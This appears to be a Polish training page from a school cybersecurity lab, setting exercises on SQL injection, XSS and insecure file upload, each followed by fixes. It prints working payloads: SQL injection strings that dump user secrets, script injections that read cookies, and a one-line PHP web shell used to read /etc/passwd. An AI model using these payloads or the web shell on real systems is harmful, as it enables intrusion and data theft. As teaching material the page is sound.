<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <title>Instrukcje | Cyber-Poligon</title>
    <style>
        body { background-color: #f8f9fa; }
        .sidebar { background: #212529; color: white; min-height: 100vh; padding: 20px; }
        .sidebar a { color: #adb5bd; text-decoration: none; display: block; padding: 10px; border-radius: 5px; }
        .sidebar a:hover { background: #343a40; color: white; }
        .sidebar a.active { background: #0d6efd; color: white; }
        .card-mission { border-left: 5px solid #ffc107; background: #fff3cd; }
        pre { background: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; }
        .badge-vuln { background-color: #dc3545; }
        .badge-secure { background-color: #198754; }
    </style>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <!-- Sidebar -->
        <nav class="col-md-2 d-none d-md-block sidebar shadow">
            <h4 class="mb-4 text-primary text-center">Menu Laboratorium</h4>
            <a href="index.php"><i class="bi bi-house-door"></i> Strona Główna</a>
            <hr>
            <a href="#narzedzia"><i class="bi bi-tools"></i> Niezbędnik</a>
            <a href="#sqli"><i class="bi bi-database"></i> SQL Injection</a>
            <a href="#xss"><i class="bi bi-code-slash"></i> XSS</a>
            <a href="#upload"><i class="bi bi-cloud-arrow-up"></i> File Upload</a>
        </nav>

        <!-- Main Content -->
        <main class="col-md-10 ms-sm-auto px-md-4 py-4">
            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                <h1 class="h2 text-dark">Podręcznik Pentestera IT</h1>
            </div>

            <!-- Sekcja Narzędzia -->
            <section id="narzedzia" class="mb-5">
                <div class="card shadow-sm border-0">
                    <div class="card-header bg-dark text-white"><h5>1. Niezbędne Narzędzia</h5></div>
                    <div class="card-body">
                        <p>Zanim zaczniesz, upewnij się, że masz przygotowane następujące narzędzia:</p>
                        <ul>
                            <li><strong>Przeglądarka (DevTools):</strong> Klawisz <code>F12</code> -> Zakładka "Network" i "Console".</li>
                            <li><strong>Burp Suite (Community):</strong> Do przechwytywania i modyfikacji zapytań HTTP.</li>
                            <li><strong>Terminal/CMD:</strong> Do uruchamiania skryptów i narzędzi automatycznych.</li>
                        </ul>
                    </div>
                </div>
            </section>

            <!-- Sekcja SQL Injection -->
            <section id="sqli" class="mb-5">
                <h3 class="text-danger"><i class="bi bi-database"></i> 01. SQL Injection</h3>
                <p>Polega na wstrzykiwaniu własnych instrukcji SQL do zapytania generowanego przez serwer.</p>
                
                <div class="card card-mission p-3 mb-3">
                    <strong>MISJA 1: Ominięcie logiki</strong>
                    <p>Spróbuj zmusić bazę danych, aby zwróciła WSZYSTKIE rekordy naraz, mimo że szukasz tylko jednego.</p>
                    <code>Payload: ' OR 1=1 -- </code>
                </div>

                <div class="card card-mission p-3 mb-3">
                    <strong>MISJA 2: Kradzież sekretów (UNION)</strong>
                    <p>Użyj operatora <code>UNION</code>, aby wyciągnąć dane z innej kolumny (np. hasła), których nie ma w standardowym widoku.</p>
                    <code>Payload: ' UNION SELECT username, secret_info FROM users -- </code>
                </div>

                <div class="bg-white p-3 border rounded shadow-sm mt-3">
                    <h6>Jak to naprawić?</h6>
                    <p>Nigdy nie łącz zmiennych bezpośrednio z zapytaniem SQL. Używaj <strong>Prepared Statements</strong> (Parametryzacja zapytań).</p>
                </div>
            </section>

            <!-- Sekcja XSS -->
            <section id="xss" class="mb-5">
                <h3 class="text-warning"><i class="bi bi-code-slash"></i> 02. Cross-Site Scripting (XSS)</h3>
                <p>Polega na wstrzyknięciu złośliwego kodu JavaScript, który wykona się w przeglądarce innego użytkownika.</p>

                <div class="card card-mission p-3 mb-3">
                    <strong>MISJA 3: Wywołaj Alert</strong>
                    <p>Sprawdź, czy pole "Imię" filtruje tagi HTML. Wyświetl okienko informacyjne.</p>
                    <code>Payload: &lt;script&gt;alert('Hacked by TwójLogin');&lt;/script&gt;</code>
                </div>

                <div class="card card-mission p-3 mb-3 border-danger" style="background: #f8d7da;">
                    <strong>MISJA 4: Kradzież ciasteczek (Zaawansowane)</strong>
                    <p>Spróbuj wyświetlić treść ciasteczek sesyjnych użytkownika w konsoli.</p>
                    <code>Payload: &lt;script&gt;console.log(document.cookie);&lt;/script&gt;</code>
                </div>

                <div class="bg-white p-3 border rounded shadow-sm mt-3">
                    <h6>Jak to naprawić?</h6>
                    <p>Zawsze "escapuj" dane wyjściowe. W PHP używaj <code>htmlspecialchars()</code>.</p>
                </div>
            </section>

            <!-- Sekcja File Upload -->
            <section id="upload" class="mb-5">
                <h3 class="text-primary"><i class="bi bi-cloud-arrow-up"></i> 03. Insecure File Upload</h3>
                <p>Jedna z najgroźniejszych luk. Pozwala wrzucić na serwer "Web Shella" i przejąć nad nim kontrolę.</p>

                <div class="card card-mission p-3 mb-3 border-dark" style="background: #e2e3e5;">
                    <strong>MISJA 5: Remote Code Execution (RCE)</strong>
                    <ol>
                        <li>Stwórz plik <code>exploit.php</code> z kodem: <code>&lt;?php echo shell_exec($_GET['c']); ?&gt;</code></li>
                        <li>Wgraj go w trybie podatnym.</li>
                        <li>Wejdź w link i dopisz w URL: <code>?c=cat /etc/passwd</code></li>
                    </ol>
                </div>

                <div class="bg-white p-3 border rounded shadow-sm mt-3">
                    <h6>Jak to naprawić?</h6>
                    <p>1. Sprawdzaj rozszerzenie i typ MIME pliku. <br>
                       2. Zmieniaj nazwę wgranego pliku na losowy hash. <br>
                       3. Wyłącz wykonywanie skryptów w folderze z plikami (np. przez <code>.htaccess</code>).</p>
                </div>
            </section>

            <footer class="mt-5 py-3 text-center text-muted border-top">
                &copy; 2024 Laboratorium Cyberbezpieczeństwa - Materiały dydaktyczne dla Technikum Informatycznego.
            </footer>
        </main>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>